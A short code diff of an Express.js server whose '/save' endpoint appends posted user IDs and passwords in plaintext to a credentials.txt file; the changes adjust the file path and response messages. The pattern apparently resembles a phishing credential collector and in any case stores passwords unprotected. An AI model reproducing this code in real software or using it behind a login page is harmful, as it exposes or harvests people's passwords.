@@ -4,22 +4,24 @@ const path = require('path');
 const app = express();
 
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname, 'public'))); // serve frontend
 
 app.post('/save', (req, res) => {
     const { userId, password } = req.body;
 
     if (userId && password) {
         const data = `UserID: ${userId}, Password: ${password}\n`;
-        fs.appendFile('credentials.txt', data, (err) => {
+        const filePath = path.join(__dirname, 'credentials.txt');
+
+        fs.appendFile(filePath, data, (err) => {
             if (err) {
                 console.error(err);
                 return res.status(500).send('Error saving data.');
             }
-            res.status(200)
+            res.status(200).send('✅ Data saved successfully!');
         });
     } else {
-        res.status(400).send('Invalid data.');
+        res.status(400).send('❌ Invalid data.');
     }
 });
 
